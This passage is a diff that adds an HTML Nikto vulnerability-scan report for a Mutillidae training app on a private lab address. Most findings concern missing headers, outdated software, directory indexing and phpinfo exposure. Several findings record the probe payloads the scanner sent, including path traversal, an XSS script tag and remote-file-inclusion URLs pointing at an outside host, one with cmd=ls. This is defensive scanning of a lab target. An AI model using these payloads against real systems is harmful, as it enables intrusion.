@@ -1,0 +1,4237 @@
+<!DOCTYPE html>
+<html>
+<head>
+ <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
+ <title>Nikto Report</title>
+ <style type="text/css">
+  .dataTable
+  {
+   font-family: tahoma, sans-serif;
+   font-size: 11pt; 
+   font-weight: normal; 
+   color: #000066;
+   background: #EEEEEE;
+   border: thin solid black;
+   width: 95%;
+  }
+  .headerTable
+  {
+   font-family: tahoma, sans-serif;
+   font-size: 15pt; 
+   font-weight: normal; 
+   color: white;
+   background: #000066;
+   border: thin solid black;
+   width: 300px;
+  }
+  .column-head
+  {
+   width: 15em;
+   font-weight:bold;
+   vertical-align: top;
+  }
+  .copyright
+  {
+   font-family: tahoma, sans-serif;
+   font-size: 10pt;
+   font-weight: normal;
+   font-style: italic;
+   color: black;
+  }
+  body
+  {
+   background: white;
+  }
+ </style>
+</head>
+<body>
+<div>
+<a name="1"></a>
+<table class="headerTable">
+ <tr>
+   <td>192.168.1.51 / 192.168.1.51 port 80</td>
+ </tr>
+</table>
+<table class="dataTable">
+ <tr>
+   <td class="column-head">Target IP</td>
+   <td>192.168.1.51</td>
+ </tr>
+ <tr>
+   <td class="column-head">Target hostname</td>
+   <td>192.168.1.51</td>
+ </tr>
+  <tr>
+   <td class="column-head">Target Port</td>
+   <td>80</td>
+ </tr>
+  <tr>
+   <td class="column-head">HTTP Server</td>
+   <td>Apache/2.2.8 (Ubuntu) DAV/2</td>
+ </tr>
+ <tr>
+   <td class="column-head">Site Link (Name)</td>
+   <td><a href="http://192.168.1.51:80/mutillidae">http://192.168.1.51:80/mutillidae</a></td>
+ </tr>
+ <tr>
+   <td class="column-head">Site Link (IP)</td>
+   <td><a href="http://192.168.1.51:80/mutillidae/">http://192.168.1.51:80/mutillidae/</a></td>
+ </tr>
+
+
+
+
+
+ </table>
+</div>
+<p></p>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/mutillidae/</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>/mutillidae/: Cookie PHPSESSID created without the httponly flag.</td>
+  </tr>
+  <tr>
+    <td class="column-head">Link</td>
+    <td>
+      <a href="http://192.168.1.51:80/mutillidae/">http://192.168.1.51:80/mutillidae/</a><br>
+    </td>
+  </tr>
+
+  <tr>
+    <td class="column-head">Reference(s)</td>
+    <td><a href='https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies'>https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies</a></td>
+  </tr>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/mutillidae/</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>/mutillidae/: Retrieved x-powered-by header: PHP/5.2.4-2ubuntu5.10.</td>
+  </tr>
+  <tr>
+    <td class="column-head">Link</td>
+    <td>
+      <a href="http://192.168.1.51:80/mutillidae/">http://192.168.1.51:80/mutillidae/</a><br>
+    </td>
+  </tr>
+
+  <tr>
+    <td class="column-head">Reference(s)</td>
+    <td></td>
+  </tr>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/mutillidae/</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>/mutillidae/: Uncommon header(s) &#x27;logged-in-user&#x27; found, with contents: .</td>
+  </tr>
+  <tr>
+    <td class="column-head">Link</td>
+    <td>
+      <a href="http://192.168.1.51:80/mutillidae/">http://192.168.1.51:80/mutillidae/</a><br>
+    </td>
+  </tr>
+
+  <tr>
+    <td class="column-head">Reference(s)</td>
+    <td></td>
+  </tr>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/mutillidae/robots.txt</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>/mutillidae/robots.txt: Server may leak inodes via ETags, header found with file /mutillidae/robots.txt, inode: 92442, size: 160, mtime: Tue May 10 17:00:04 2011.</td>
+  </tr>
+  <tr>
+    <td class="column-head">Link</td>
+    <td>
+      <a href="http://192.168.1.51:80/mutillidae/robots.txt">http://192.168.1.51:80/mutillidae/robots.txt</a><br>
+    </td>
+  </tr>
+
+  <tr>
+    <td class="column-head">Reference(s)</td>
+    <td><a href='https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418'>CVE-2003-1418</a></td>
+  </tr>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/mutillidae/robots.txt</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>/robots.txt: contains 6 entries which should be manually viewed.</td>
+  </tr>
+  <tr>
+    <td class="column-head">Link</td>
+    <td>
+      <a href="http://192.168.1.51:80/mutillidae/robots.txt">http://192.168.1.51:80/mutillidae/robots.txt</a><br>
+    </td>
+  </tr>
+
+  <tr>
+    <td class="column-head">Reference(s)</td>
+    <td><a href='https://developer.mozilla.org/en-US/docs/Glossary/Robots.txt'>https://developer.mozilla.org/en-US/docs/Glossary/Robots.txt</a></td>
+  </tr>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/mutillidae/index</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>/mutillidae/index: Uncommon header(s) &#x27;tcn&#x27; found, with contents: list.</td>
+  </tr>
+  <tr>
+    <td class="column-head">Link</td>
+    <td>
+      <a href="http://192.168.1.51:80/mutillidae/index">http://192.168.1.51:80/mutillidae/index</a><br>
+    </td>
+  </tr>
+
+  <tr>
+    <td class="column-head">Reference(s)</td>
+    <td></td>
+  </tr>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/mutillidae/index</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>/index: Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. The following alternatives for &#x27;index&#x27; were found: index.php.</td>
+  </tr>
+  <tr>
+    <td class="column-head">Link</td>
+    <td>
+      <a href="http://192.168.1.51:80/mutillidae/index">http://192.168.1.51:80/mutillidae/index</a><br>
+    </td>
+  </tr>
+
+  <tr>
+    <td class="column-head">Reference(s)</td>
+    <td><a href='http://www.wisec.it/sectou.php?id=4698ebdc59d15,https://exchange.xforce.ibmcloud.com/vulnerabilities/8275'>http://www.wisec.it/sectou.php?id=4698ebdc59d15,https://exchange.xforce.ibmcloud.com/vulnerabilities/8275</a></td>
+  </tr>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/mutillidae/</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>HEAD</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>PHP/5.2.4-2ubuntu5.10 appears to be outdated (current is at least 8.5.1).</td>
+  </tr>
+  <tr>
+    <td class="column-head">Link</td>
+    <td>
+      <a href="http://192.168.1.51:80/mutillidae/">http://192.168.1.51:80/mutillidae/</a><br>
+    </td>
+  </tr>
+
+  <tr>
+    <td class="column-head">Reference(s)</td>
+    <td></td>
+  </tr>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/mutillidae/</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>HEAD</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>Apache/2.2.8 appears to be outdated (current is at least 2.4.66).</td>
+  </tr>
+  <tr>
+    <td class="column-head">Link</td>
+    <td>
+      <a href="http://192.168.1.51:80/mutillidae/">http://192.168.1.51:80/mutillidae/</a><br>
+    </td>
+  </tr>
+
+  <tr>
+    <td class="column-head">Reference(s)</td>
+    <td></td>
+  </tr>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/mutillidae/</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>/mutillidae/: Suggested security header missing: permissions-policy.</td>
+  </tr>
+  <tr>
+    <td class="column-head">Link</td>
+    <td>
+      <a href="http://192.168.1.51:80/mutillidae/">http://192.168.1.51:80/mutillidae/</a><br>
+    </td>
+  </tr>
+
+  <tr>
+    <td class="column-head">Reference(s)</td>
+    <td><a href='https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Permissions-Policy'>https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Permissions-Policy</a></td>
+  </tr>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/mutillidae/</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>/mutillidae/: Suggested security header missing: content-security-policy.</td>
+  </tr>
+  <tr>
+    <td class="column-head">Link</td>
+    <td>
+      <a href="http://192.168.1.51:80/mutillidae/">http://192.168.1.51:80/mutillidae/</a><br>
+    </td>
+  </tr>
+
+  <tr>
+    <td class="column-head">Reference(s)</td>
+    <td><a href='https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP'>https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP</a></td>
+  </tr>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/mutillidae/</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>/mutillidae/: Suggested security header missing: referrer-policy.</td>
+  </tr>
+  <tr>
+    <td class="column-head">Link</td>
+    <td>
+      <a href="http://192.168.1.51:80/mutillidae/">http://192.168.1.51:80/mutillidae/</a><br>
+    </td>
+  </tr>
+
+  <tr>
+    <td class="column-head">Reference(s)</td>
+    <td><a href='https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referrer-Policy'>https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referrer-Policy</a></td>
+  </tr>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/mutillidae/</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>/mutillidae/: Suggested security header missing: strict-transport-security.</td>
+  </tr>
+  <tr>
+    <td class="column-head">Link</td>
+    <td>
+      <a href="http://192.168.1.51:80/mutillidae/">http://192.168.1.51:80/mutillidae/</a><br>
+    </td>
+  </tr>
+
+  <tr>
+    <td class="column-head">Reference(s)</td>
+    <td><a href='https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Strict-Transport-Security'>https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Strict-Transport-Security</a></td>
+  </tr>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/mutillidae/</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>/mutillidae/: Suggested security header missing: x-content-type-options.</td>
+  </tr>
+  <tr>
+    <td class="column-head">Link</td>
+    <td>
+      <a href="http://192.168.1.51:80/mutillidae/">http://192.168.1.51:80/mutillidae/</a><br>
+    </td>
+  </tr>
+
+  <tr>
+    <td class="column-head">Reference(s)</td>
+    <td><a href='https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Content-Type-Options'>https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Content-Type-Options</a></td>
+  </tr>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/mutillidae/</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>GKPLKUZS</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>/: Web Server returns a valid response with junk HTTP methods which may cause false positives.</td>
+  </tr>
+  <tr>
+    <td class="column-head">Link</td>
+    <td>
+      <a href="http://192.168.1.51:80/mutillidae/">http://192.168.1.51:80/mutillidae/</a><br>
+    </td>
+  </tr>
+
+  <tr>
+    <td class="column-head">Reference(s)</td>
+    <td></td>
+  </tr>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/mutillidae/</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>DEBUG</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>/: DEBUG HTTP verb may show server debugging information.</td>
+  </tr>
+  <tr>
+    <td class="column-head">Link</td>
+    <td>
+      <a href="http://192.168.1.51:80/mutillidae/">http://192.168.1.51:80/mutillidae/</a><br>
+    </td>
+  </tr>
+
+  <tr>
+    <td class="column-head">Reference(s)</td>
+    <td><a href='https://docs.microsoft.com/en-us/visualstudio/debugger/how-to-enable-debugging-for-aspnet-applications?view=vs-2017'>https://docs.microsoft.com/en-us/visualstudio/debugger/how-to-enable-debugging-for-aspnet-applications?view=vs-2017</a></td>
+  </tr>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/mutillidae/</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>TRACE</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>/: HTTP TRACE method is active and replies which suggests the host is vulnerable to XST.</td>
+  </tr>
+  <tr>
+    <td class="column-head">Link</td>
+    <td>
+      <a href="http://192.168.1.51:80/mutillidae/">http://192.168.1.51:80/mutillidae/</a><br>
+    </td>
+  </tr>
+
+  <tr>
+    <td class="column-head">Reference(s)</td>
+    <td><a href='https://owasp.org/www-community/attacks/Cross_Site_Tracing'>https://owasp.org/www-community/attacks/Cross_Site_Tracing</a></td>
+  </tr>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/mutillidae/index.php?page=..\..\..\..\..\..\..\..\\Windows\win.ini</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>/mutillidae/index.php: PHP include error may indicate local or remote file inclusion is possible.</td>
+  </tr>
+  <tr>
+    <td class="column-head">Link</td>
+    <td>
+      <a href="http://192.168.1.51:80/mutillidae/index.php?page=..\..\..\..\..\..\..\..\\Windows\win.ini">http://192.168.1.51:80/mutillidae/index.php?page=..\..\..\..\..\..\..\..\\Windows\win.ini</a><br>
+    </td>
+  </tr>
+
+  <tr>
+    <td class="column-head">Reference(s)</td>
+    <td></td>
+  </tr>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/mutillidae/phpinfo.php?VARIABLE=&lt;script&gt;alert(&#x27;Vulnerable&#x27;)&lt;/script&gt;</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>/mutillidae/phpinfo.php: Output from the phpinfo() function was found.</td>
+  </tr>
+  <tr>
+    <td class="column-head">Link</td>
+    <td>
+      <a href="http://192.168.1.51:80/mutillidae/phpinfo.php?VARIABLE=&lt;script&gt;alert(&#x27;Vulnerable&#x27;)&lt;/script&gt;">http://192.168.1.51:80/mutillidae/phpinfo.php?VARIABLE=&lt;script&gt;alert(&#x27;Vulnerable&#x27;)&lt;/script&gt;</a><br>
+    </td>
+  </tr>
+
+  <tr>
+    <td class="column-head">Reference(s)</td>
+    <td></td>
+  </tr>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/mutillidae/?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>/mutillidae/?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP Easter Eggs reveals potentially sensitive information via HTTP requests that contain specific QUERY strings.</td>
+  </tr>
+  <tr>
+    <td class="column-head">Link</td>
+    <td>
+      <a href="http://192.168.1.51:80/mutillidae/?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000">http://192.168.1.51:80/mutillidae/?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000</a><br>
+    </td>
+  </tr>
+
+  <tr>
+    <td class="column-head">Reference(s)</td>
+    <td><a href='https://labs.detectify.com/writeups/do-you-dare-to-show-your-php-easter-egg/'>https://labs.detectify.com/writeups/do-you-dare-to-show-your-php-easter-egg/</a></td>
+  </tr>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/mutillidae/?=PHPE9568F36-D428-11d2-A769-00AA001ACF42</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>/mutillidae/?=PHPE9568F36-D428-11d2-A769-00AA001ACF42: PHP Easter Egg reveals potentially sensitive information via HTTP requests that contain specific QUERY strings.</td>
+  </tr>
+  <tr>
+    <td class="column-head">Link</td>
+    <td>
+      <a href="http://192.168.1.51:80/mutillidae/?=PHPE9568F36-D428-11d2-A769-00AA001ACF42">http://192.168.1.51:80/mutillidae/?=PHPE9568F36-D428-11d2-A769-00AA001ACF42</a><br>
+    </td>
+  </tr>
+
+  <tr>
+    <td class="column-head">Reference(s)</td>
+    <td><a href='https://labs.detectify.com/writeups/do-you-dare-to-show-your-php-easter-egg/'>https://labs.detectify.com/writeups/do-you-dare-to-show-your-php-easter-egg/</a></td>
+  </tr>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/mutillidae/?=PHPE9568F34-D428-11d2-A769-00AA001ACF42</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>/mutillidae/?=PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP Easter Egg reveals potentially sensitive information via HTTP requests that contain specific QUERY strings.</td>
+  </tr>
+  <tr>
+    <td class="column-head">Link</td>
+    <td>
+      <a href="http://192.168.1.51:80/mutillidae/?=PHPE9568F34-D428-11d2-A769-00AA001ACF42">http://192.168.1.51:80/mutillidae/?=PHPE9568F34-D428-11d2-A769-00AA001ACF42</a><br>
+    </td>
+  </tr>
+
+  <tr>
+    <td class="column-head">Reference(s)</td>
+    <td><a href='https://labs.detectify.com/writeups/do-you-dare-to-show-your-php-easter-egg/'>https://labs.detectify.com/writeups/do-you-dare-to-show-your-php-easter-egg/</a></td>
+  </tr>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/mutillidae/?=PHPE9568F35-D428-11d2-A769-00AA001ACF42</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>/mutillidae/?=PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP Easter Egg reveals potentially sensitive information via HTTP requests that contain specific QUERY strings.</td>
+  </tr>
+  <tr>
+    <td class="column-head">Link</td>
+    <td>
+      <a href="http://192.168.1.51:80/mutillidae/?=PHPE9568F35-D428-11d2-A769-00AA001ACF42">http://192.168.1.51:80/mutillidae/?=PHPE9568F35-D428-11d2-A769-00AA001ACF42</a><br>
+    </td>
+  </tr>
+
+  <tr>
+    <td class="column-head">Reference(s)</td>
+    <td><a href='https://labs.detectify.com/writeups/do-you-dare-to-show-your-php-easter-egg/'>https://labs.detectify.com/writeups/do-you-dare-to-show-your-php-easter-egg/</a></td>
+  </tr>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/mutillidae/home/</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>/mutillidae/home/: This might be interesting.</td>
+  </tr>
+  <tr>
+    <td class="column-head">Link</td>
+    <td>
+      <a href="http://192.168.1.51:80/mutillidae/home/">http://192.168.1.51:80/mutillidae/home/</a><br>
+    </td>
+  </tr>
+
+  <tr>
+    <td class="column-head">Reference(s)</td>
+    <td></td>
+  </tr>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/mutillidae/includes/</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>/mutillidae/includes/: Directory indexing found.</td>
+  </tr>
+  <tr>
+    <td class="column-head">Link</td>
+    <td>
+      <a href="http://192.168.1.51:80/mutillidae/includes/">http://192.168.1.51:80/mutillidae/includes/</a><br>
+    </td>
+  </tr>
+
+  <tr>
+    <td class="column-head">Reference(s)</td>
+    <td></td>
+  </tr>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/mutillidae/includes/</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>/mutillidae/includes/: This might be interesting.</td>
+  </tr>
+  <tr>
+    <td class="column-head">Link</td>
+    <td>
+      <a href="http://192.168.1.51:80/mutillidae/includes/">http://192.168.1.51:80/mutillidae/includes/</a><br>
+    </td>
+  </tr>
+
+  <tr>
+    <td class="column-head">Reference(s)</td>
+    <td></td>
+  </tr>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/mutillidae/login/</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>/mutillidae/login/: This might be interesting.</td>
+  </tr>
+  <tr>
+    <td class="column-head">Link</td>
+    <td>
+      <a href="http://192.168.1.51:80/mutillidae/login/">http://192.168.1.51:80/mutillidae/login/</a><br>
+    </td>
+  </tr>
+
+  <tr>
+    <td class="column-head">Reference(s)</td>
+    <td></td>
+  </tr>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/mutillidae/passwords/</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>/mutillidae/passwords/: Directory indexing found.</td>
+  </tr>
+  <tr>
+    <td class="column-head">Link</td>
+    <td>
+      <a href="http://192.168.1.51:80/mutillidae/passwords/">http://192.168.1.51:80/mutillidae/passwords/</a><br>
+    </td>
+  </tr>
+
+  <tr>
+    <td class="column-head">Reference(s)</td>
+    <td></td>
+  </tr>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/mutillidae/passwords/</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>/mutillidae/passwords/: This might be interesting.</td>
+  </tr>
+  <tr>
+    <td class="column-head">Link</td>
+    <td>
+      <a href="http://192.168.1.51:80/mutillidae/passwords/">http://192.168.1.51:80/mutillidae/passwords/</a><br>
+    </td>
+  </tr>
+
+  <tr>
+    <td class="column-head">Reference(s)</td>
+    <td></td>
+  </tr>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/mutillidae/register/</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>/mutillidae/register/: This might be interesting.</td>
+  </tr>
+  <tr>
+    <td class="column-head">Link</td>
+    <td>
+      <a href="http://192.168.1.51:80/mutillidae/register/">http://192.168.1.51:80/mutillidae/register/</a><br>
+    </td>
+  </tr>
+
+  <tr>
+    <td class="column-head">Reference(s)</td>
+    <td></td>
+  </tr>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/mutillidae/phpinfo.php</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>/mutillidae/phpinfo.php: PHP is installed, and a test script which runs phpinfo() was found. This gives a lot of system information.</td>
+  </tr>
+  <tr>
+    <td class="column-head">Link</td>
+    <td>
+      <a href="http://192.168.1.51:80/mutillidae/phpinfo.php">http://192.168.1.51:80/mutillidae/phpinfo.php</a><br>
+    </td>
+  </tr>
+
+  <tr>
+    <td class="column-head">Reference(s)</td>
+    <td><a href='https://cwe.mitre.org/data/definitions/CWE-552.html'>CWE-552</a></td>
+  </tr>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/mutillidae/index.php</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>/mutillidae/index.php: PHP is installed, and a test script which runs phpinfo() was found. This gives a lot of system information.</td>
+  </tr>
+  <tr>
+    <td class="column-head">Link</td>
+    <td>
+      <a href="http://192.168.1.51:80/mutillidae/index.php">http://192.168.1.51:80/mutillidae/index.php</a><br>
+    </td>
+  </tr>
+
+  <tr>
+    <td class="column-head">Reference(s)</td>
+    <td><a href='https://cwe.mitre.org/data/definitions/CWE-552.html'>CWE-552</a></td>
+  </tr>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/mutillidae/images/</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>/mutillidae/images/: Directory indexing found.</td>
+  </tr>
+  <tr>
+    <td class="column-head">Link</td>
+    <td>
+      <a href="http://192.168.1.51:80/mutillidae/images/">http://192.168.1.51:80/mutillidae/images/</a><br>
+    </td>
+  </tr>
+
+  <tr>
+    <td class="column-head">Reference(s)</td>
+    <td></td>
+  </tr>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/mutillidae/styles/</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>/mutillidae/styles/: Directory indexing found.</td>
+  </tr>
+  <tr>
+    <td class="column-head">Link</td>
+    <td>
+      <a href="http://192.168.1.51:80/mutillidae/styles/">http://192.168.1.51:80/mutillidae/styles/</a><br>
+    </td>
+  </tr>
+
+  <tr>
+    <td class="column-head">Reference(s)</td>
+    <td></td>
+  </tr>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/mutillidae/config.inc</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>/mutillidae/config.inc: DotBr 0.1 configuration file includes usernames and passwords.</td>
+  </tr>
+  <tr>
+    <td class="column-head">Link</td>
+    <td>
+      <a href="http://192.168.1.51:80/mutillidae/config.inc">http://192.168.1.51:80/mutillidae/config.inc</a><br>
+    </td>
+  </tr>
+
+  <tr>
+    <td class="column-head">Reference(s)</td>
+    <td><a href='https://vulners.com/osvdb/OSVDB:5092'>OSVDB-5092</a></td>
+  </tr>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/mutillidae/?_CONFIG[files][functions_page]=https://cirt.net/public/rfiinc.txt</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>/mutillidae/?_CONFIG[files][functions_page]=https://cirt.net/public/rfiinc.txt: Remote File Inclusion (RFI) from RSnake&#x27;s RFI list.</td>
+  </tr>
+  <tr>
+    <td class="column-head">Link</td>
+    <td>
+      <a href="http://192.168.1.51:80/mutillidae/?_CONFIG[files][functions_page]=https://cirt.net/public/rfiinc.txt">http://192.168.1.51:80/mutillidae/?_CONFIG[files][functions_page]=https://cirt.net/public/rfiinc.txt</a><br>
+    </td>
+  </tr>
+
+  <tr>
+    <td class="column-head">Reference(s)</td>
+    <td><a href='https://gist.github.com/mubix/5d269c686584875015a2'>https://gist.github.com/mubix/5d269c686584875015a2</a></td>
+  </tr>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/mutillidae/?npage=-1&amp;content_dir=https://cirt.net/public/rfiinc.txt%00&amp;cmd=ls</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>/mutillidae/?npage=-1&amp;content_dir=https://cirt.net/public/rfiinc.txt%00&amp;cmd=ls: Remote File Inclusion (RFI) from RSnake&#x27;s RFI list.</td>
